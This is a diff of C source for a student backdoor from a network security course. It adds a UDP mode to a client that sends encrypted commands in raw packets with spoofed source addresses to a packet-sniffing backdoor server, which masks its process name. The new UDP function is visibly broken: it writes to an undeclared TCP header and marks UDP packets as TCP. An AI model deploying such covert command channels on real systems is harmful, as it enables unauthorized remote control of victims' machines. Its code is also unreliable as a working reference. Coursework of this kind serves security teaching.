@@ -39,15 +39,18 @@ int main(int argc, char **argv){
     /* Parse arguments */
     
     int is_server = 0;
+    int use_udp = 0;
     struct client_opt c_opt;
     c_opt.target_host[0] = '\0';
     c_opt.command[0] = '\0';
     c_opt.target_port = 0;
+    c_opt.protocol = 0;
     struct server_opt s_opt;
     s_opt.device[0] = '\0';
+    s_opt.protocol = 0;
     
     int opt;
-    while((opt = getopt(argc, argv, "hsc:d:p:x:")) != -1){
+    while((opt = getopt(argc, argv, "hsc:d:p:u:x:")) != -1){
         switch(opt){
             case 'h':
                 usage();
@@ -64,6 +67,10 @@ int main(int argc, char **argv){
                 break;
             case 'p':
                 c_opt.target_port = atoi(optarg);
+                break;
+            case 'u':
+                c_opt.protocol = 1;
+                s_opt.protocol = 1;
                 break;
             case 'x':
                 strcpy(c_opt.command, optarg);
@@ -116,6 +123,10 @@ void client(struct client_opt c_opt){
     printf("Running client...\n");
     printf("Target Host: %s\n",c_opt.target_host);
     printf("Target Port: %d\n",c_opt.target_port);
+    if(c_opt.protocol == 1)
+        printf("Protocol: UDP\n");
+    else
+        printf("Protocol: TCP\n");
     printf("Command: %s\n",c_opt.command);
     
     /* Encrypt command */
@@ -137,13 +148,20 @@ void client(struct client_opt c_opt){
     user_addr.raw_socket = 0;
     
     // Create a raw socket and set SO_REUSEADDR
-    user_addr.raw_socket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    if(c_opt.protocol == 1)
+        user_addr.raw_socket = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
+    else
+        user_addr.raw_socket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    
     int arg = 1;
     if(setsockopt(user_addr.raw_socket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
         system_fatal("setsockopt");
     
     // Send packet
-    send_datagram(&user_addr, bd_message, bd_message_len);
+     if(c_opt.protocol == 1)
+        send_udp_datagram(&user_addr, bd_message, bd_message_len);
+    else
+        send_tcp_datagram(&user_addr, bd_message, bd_message_len);
     
     /* Receive reply and print */
     
@@ -190,6 +208,10 @@ void client(struct client_opt c_opt){
 void server(struct server_opt s_opt){
 
     printf("Running server...\n");
+    if(s_opt.protocol == 1)
+        printf("Protocol: UDP\n");
+    else
+        printf("Protocol: TCP\n");
     
     /* Initialize variables and functions */
     
@@ -253,11 +275,11 @@ void server(struct server_opt s_opt){
 
 /*
 | ------------------------------------------------------------------------------
-| Send Raw Packet
+| Send Raw TCP Packet
 | ------------------------------------------------------------------------------
 */
 
-int send_datagram(struct addr_info *user_addr, char *data, int data_len){
+int send_tcp_datagram(struct addr_info *user_addr, char *data, int data_len){
     
     /* Declare variables */
     
@@ -272,7 +294,7 @@ int send_datagram(struct addr_info *user_addr, char *data, int data_len){
     sin.sin_port = htons(user_addr->dport);
     sin.sin_addr.s_addr = inet_addr(user_addr->dhost);
     
-    pseudo_header psh;
+    pseudo_tcp_header psh;
     
     // Zero out the buffer where the datagram will be stored
     memset(datagram, 0, PKT_SIZE);
@@ -297,7 +319,7 @@ int send_datagram(struct addr_info *user_addr, char *data, int data_len){
     
     tcph->source = htons(user_addr->sport);
     tcph->dest = htons(user_addr->dport);
-    tcph->seq = 0;
+    tcph->seq = 1487534554;
     tcph->ack_seq = 0;
     tcph->doff = 5; // Data Offset is set to the TCP header length 
     tcph->fin = 0;
@@ -324,7 +346,103 @@ int send_datagram(struct addr_info *user_addr, char *data, int data_len){
     memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
     psh.data = data;
     
-    tcph->check = csum((unsigned short*)&psh, sizeof(pseudo_header));
+    tcph->check = csum((unsigned short*)&psh, sizeof(pseudo_tcp_header));
+ 
+    /* Build our own header */
+    
+    {
+        int one = 1;
+        const int *val = &one;
+        if (setsockopt (user_addr->raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
+            system_fatal("setsockopt");
+    }
+ 
+    /* Send the packet */
+    
+    if(sendto(user_addr->raw_socket, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
+        system_fatal("sendto");
+        return -1;
+    }
+    else{
+        printf("Sent command!\n");
+        return 0;
+    }
+}
+
+/*
+| ------------------------------------------------------------------------------
+| Send Raw UDP Packet (Duplicate of send_tcp_datagram() above)
+| ------------------------------------------------------------------------------
+*/
+
+int send_udp_datagram(struct addr_info *user_addr, char *data, int data_len){
+    
+    /* Declare variables */
+    
+    // Typecast datagram
+    char datagram[PKT_SIZE];
+    struct iphdr *iph = (struct iphdr *)datagram;
+    struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));
+    char *data_ptr = (char *)(datagram + sizeof(struct iphdr) + sizeof(struct udphdr));
+    
+    struct sockaddr_in sin;
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(user_addr->dport);
+    sin.sin_addr.s_addr = inet_addr(user_addr->dhost);
+    
+    pseudo_udp_header psh;
+    
+    // Zero out the buffer where the datagram will be stored
+    memset(datagram, 0, PKT_SIZE);
+
+    /* IP header */
+
+    iph->ihl = 5;
+    iph->version = 4;
+    iph->tos = 0;
+    iph->tot_len = htons((short)(sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len));
+    iph->id = htons(DEFAULT_IP_ID);
+    iph->frag_off = 0;
+    iph->ttl = DEFAULT_TTL;
+    iph->protocol = IPPROTO_TCP;
+    iph->check = 0; // Initialize to zero before calculating checksum
+    iph->saddr = inet_addr(user_addr->shost);
+    iph->daddr = sin.sin_addr.s_addr;
+ 
+    iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);
+ 
+    /* TCP header */
+    
+    tcph->source = htons(user_addr->sport);
+    tcph->dest = htons(user_addr->dport);
+    tcph->seq = 1487534554;
+    tcph->ack_seq = 0;
+    tcph->doff = 5; // Data Offset is set to the TCP header length 
+    tcph->fin = 0;
+    tcph->syn = 1;
+    tcph->rst = 0;
+    tcph->psh = 0;
+    tcph->ack = 0;
+    tcph->urg = 0;
+    tcph->window = htons(WIN_SIZE);
+    tcph->check = 0; // Initialize the checksum to zero (kernel's IP stack will fill in the correct checksum during transmission)
+    tcph->urg_ptr = 0;
+   
+    /* Data */
+    
+    memcpy(data_ptr, data, data_len);
+      
+    /* Calculate Checksum */
+    
+    psh.source_address = inet_addr(user_addr->shost);
+    psh.dest_address = sin.sin_addr.s_addr;
+    psh.placeholder = 0;
+    psh.protocol = IPPROTO_TCP;
+    psh.tcp_length = htons(sizeof(struct tcphdr) + data_len);
+    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
+    psh.data = data;
+    
+    tcph->check = csum((unsigned short*)&psh, sizeof(pseudo_udp_header));
  
     /* Build our own header */
     
@@ -441,10 +559,11 @@ void mask_process(char *argv[], char *name){
 void usage(){
     
     printf("\n");
-    printf("COMP 8505 Assignment 2 - Packet Sniffing Backdoor\n");
+    printf("COMP 8505 Final Project - Packet Sniffing Backdoor\n");
     printf("Usage: ./backdoor [OPTIONS]\n");
     printf("---------------------------\n");
     printf("  -h                    Display this help.\n");
+    printf("  -u                    Use UDP instead of TCP (TCP is default).\n");
     printf("CLIENT (default)\n");
     printf("  -d <target_host>      The target host where the backdoor server is running.\n");
     printf("  -p <target_port>      The target port to send to.\n");
